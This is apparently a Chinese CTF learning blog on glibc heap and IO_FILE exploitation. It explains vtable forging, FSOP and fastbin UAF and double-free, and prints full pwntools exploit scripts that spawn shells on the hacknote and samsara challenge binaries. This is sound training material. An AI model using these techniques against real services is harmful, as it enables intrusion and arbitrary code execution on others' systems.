class=\"meta-keyword\">if</span> 0</span></span><br><span class=\"line\">    get_column;</span><br><span class=\"line\">    set_column;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>\n<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>\n<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base</span><br><span class=\"line\">        &amp;&amp; want &lt; (<span class=\"keyword\">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (__underflow (fp) == EOF)</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>函数源码如上，实现的是一个键盘输入。 </p>\n<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>\n<h3 id=\"伪造vtable\"><a href=\"#伪造vtable\" class=\"headerlink\" title=\"伪造vtable\"></a>伪造vtable</h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>\n<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>\n<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>\n<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>\n<p>但是我们先从第一个方法来试一试。</p>\n<p>示例来源于ctf-wiki</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *vtable_ptr;</span><br><span class=\"line\">    fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">    vtable_ptr=*(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//get vtable</span></span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_ptr[<span class=\"number\">7</span>]=<span class=\"number\">0x41414141</span> <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;call 0x41414141&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这边利用的具体步骤比较直观。</p>\n<p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>\n<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>\n<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>\n<p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; <span class=\"built_in\">print</span> _IO_2_1_stdin_</span><br><span class=\"line\"><span class=\"variable\">$2</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = -72540024, </span><br><span class=\"line\">    _IO_read_ptr = 0x0, </span><br><span class=\"line\">    _IO_read_end = 0x0, </span><br><span class=\"line\">    _IO_read_base = 0x0, </span><br><span class=\"line\">    _IO_write_base = 0x0, </span><br><span class=\"line\">    _IO_write_ptr = 0x0, </span><br><span class=\"line\">    _IO_write_end = 0x0, </span><br><span class=\"line\">    _IO_buf_base = 0x0, </span><br><span class=\"line\">    _IO_buf_end = 0x0, </span><br><span class=\"line\">    _IO_save_base = 0x0, </span><br><span class=\"line\">    _IO_backup_base = 0x0, </span><br><span class=\"line\">    _IO_save_end = 0x0, </span><br><span class=\"line\">    _markers = 0x0, </span><br><span class=\"line\">    _chain = 0x0, </span><br><span class=\"line\">    _fileno = 0, </span><br><span class=\"line\">    _flags2 = 0, </span><br><span class=\"line\">    _old_offset = -1, </span><br><span class=\"line\">    _cur_column = 0, </span><br><span class=\"line\">    _vtable_offset = 0 <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class=\"line\">    _offset = -1, </span><br><span class=\"line\">    _codecvt = 0x0, </span><br><span class=\"line\">    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, </span><br><span class=\"line\">    _freeres_list = 0x0, </span><br><span class=\"line\">    _freeres_buf = 0x0, </span><br><span class=\"line\">    __pad5 = 0, </span><br><span class=\"line\">    _mode = 0, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats 19 <span class=\"built_in\">times</span>&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>\n<p>然后我们需要在它附近伪造一个vtable。</p>\n<ol>\n<li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>\n</ol>\n<p>完整exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;the_end&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = long(sleep_ad,<span class=\"number\">16</span>) - libc.symbols[<span class=\"string\">&#x27;sleep&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0xf02b0</span></span><br><span class=\"line\">vtables =     libc_base + <span class=\"number\">0x3C56F8</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_vtable = libc_base + <span class=\"number\">0x3c5588</span></span><br><span class=\"line\">target_addr = libc_base + <span class=\"number\">0x3c55e0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">    p.send(p64(vtables+i))</span><br><span class=\"line\">    p.send(p64(fake_vtable)[i])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    p.send(p64(target_addr+i))</span><br><span class=\"line\">    p.send(p64(one_gadget)[i])</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了。</p>\n<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>\n<h3 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>\n<p>这一个part我们学习FSOP。</p>\n<p>ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧///</p>\n<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项</p>\n","categories":["OTHER - IO FILE"],"tags":["io_file"]},{"title":"fastbin attack","url":"/2021/12/06/fastbin_attack/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-FCwQMhdY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"fastbin？\"><a href=\"#fastbin？\" class=\"headerlink\" title=\"fastbin？\"></a>fastbin？</h2><p>​    </p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>​    长度在<code>32-160</code>(32位系统是<code>16-80</code>)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。</p>\n<h2 id=\"UAF\"><a href=\"#UAF\" class=\"headerlink\" title=\"UAF\"></a>UAF</h2><p>​        先从一个简单的例子开始：</p>\n<h4 id=\"hacknote\"><a href=\"#hacknote\" class=\"headerlink\" title=\"hacknote\"></a>hacknote</h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote\">题目链接</a></p>\n<p>​        菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用<code>print_note</code>实则是在调用后门函数。</p>\n<p>​        然后来详细分析一下题目的逻辑。</p>\n<p>​        在<code>add_note()</code>中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：<code>printnote</code>    的指针和<code>content</code>的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。</p>\n<p>​        每个note的chunk的地址是连续的。</p>\n<p>​        我们连续申请两个note。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;aaaa&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.00.23.png\" alt=\"截屏2021-12-06 下午10.00.23\"></p>\n<p>​        可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。</p>\n<p>​        然后我们分别释放这两个chunk。</p>\n<p>（然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.13.27.png\" alt=\"截屏2021-12-06 下午10.13.27\"></p>\n<p>​        </p>\n<p>​        问题不大，pwndocker好处就体现在此。</p>\n<p>​        可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.15.51.png\" alt=\"截屏2021-12-06 下午10.15.51\"></p>\n<p>​        可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.10.37.png\" alt=\"截屏2021-12-06 下午11.10.37\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.12.17.png\" alt=\"截屏2021-12-06 下午11.12.17\"></p>\n<p>​            fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是<code>0x5695c038</code>和<code>0x5695c0300</code>。</p>\n<p>​        也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的*put和 *content，也就是说，如果我们此刻执行<code>print(note0)</code>,那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。</p>\n<p>​        此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.25.50.png\" alt=\"截屏2021-12-06 下午11.25.50\"></p>\n<p>完整exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>, <span class=\"string\">&quot;./hacknote&quot;</span>], env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>:<span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">##context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addnote</span>(<span class=\"params\">size, content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delnote</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printnote</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;yuuu&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">delnote(<span class=\"number\">0</span>) <span class=\"comment\"># delete note 0</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># delete note 1</span></span><br><span class=\"line\">addnote(<span class=\"number\">8</span>, p32(<span class=\"number\">0x8048986</span>))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">printnote(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"pwnable-hacknote\"><a href=\"#pwnable-hacknote\" class=\"headerlink\" title=\"pwnable_hacknote\"></a>pwnable_hacknote</h4><p>​        好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。</p>\n<p>​        <a href=\"https://pwnable.tw/challenge/#5\">题目链接</a></p>\n<p>​        源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>, <span class=\"string\">&quot;./hacknote&quot;</span>], env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>:<span class=\"string\">&quot;/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6&quot;</span>&#125;)</span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc_32.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print_addr = <span class=\"number\">0x804862b</span></span><br><span class=\"line\">puts_got = <span class=\"number\">0x804A024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addnote</span>(<span class=\"params\">size, content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delnote</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printnote</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;yuuu&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">delnote(<span class=\"number\">0</span>) <span class=\"comment\"># delete note 0</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># delete note 1</span></span><br><span class=\"line\">addnote(<span class=\"number\">8</span>,p32(print_addr)+p32(puts_got))</span><br><span class=\"line\">printnote(<span class=\"number\">0</span>)</span><br><span class=\"line\">puts_addr = u32(r.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">libc_base = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>] - libc_base</span><br><span class=\"line\">delnote(<span class=\"number\">2</span>)</span><br><span class=\"line\">addnote(<span class=\"number\">8</span>,flat([system_addr,<span class=\"string\">&quot;||sh&quot;</span>]))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">printnote(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"FastbinDoubleFree\"><a href=\"#FastbinDoubleFree\" class=\"headerlink\" title=\"FastbinDoubleFree\"></a>FastbinDoubleFree</h2><p>​        </p>\n<p>​    关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与<code>main_arena</code>直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。</p>\n<p>​        从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为<code>main_arena</code>（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。</p>\n<p>高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。            </p>\n<p>​        例子来源于之前做过的一些题：</p>\n<h4 id=\"metasequoia-2020-samsara\"><a href=\"#metasequoia-2020-samsara\" class=\"headerlink\" title=\"metasequoia_2020_samsara\"></a>metasequoia_2020_samsara</h4><p>​        <a href=\"https://github.com/fuurinko/CTF-TASK/blob/main/metasequoia_2020_samsara\">题目链接</a></p>\n<p>​        逻辑比较好逆，如果v8等于deadbeef就能getshell。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.28.11.png\" alt=\"截屏2021-12-07 下午10.28.11\"></p>\n<p>​        </p>\n<p>​        然后变量的栈布局是这样的</p>\n<p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.27.32.png\" alt=\"截屏2021-12-07 下午10.27.32\"></p>\n<p>​        可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写</p>\n<p>​        然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。</p>\n<p>​        那么思路大概是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">add chunk0</span><br><span class=\"line\">add chunk1</span><br><span class=\"line\">add chunk2#防止free chunk被top chunk合并</span><br><span class=\"line\"></span><br><span class=\"line\">free chunk0</span><br><span class=\"line\">free chunk1</span><br><span class=\"line\">free chunk0</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    此刻fastbin链表大致如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    然后此时再</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">add chunk3 #申请到的是chunk0的内存空间</span><br><span class=\"line\">edit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得）</span><br><span class=\"line\">然后链表大概长这样：</span><br><span class=\"line\">main_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正）</span><br><span class=\"line\">所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。</span><br></pre></td></tr></table></figure>\n\n<p>​        然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。</p>\n<p>​        （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。）    </p>\n<p>​        （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./metasequoia_2020_samsara&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./metasequoia_2020_samsara&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27450</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./metasequoia_2020_samsara&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>():</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span 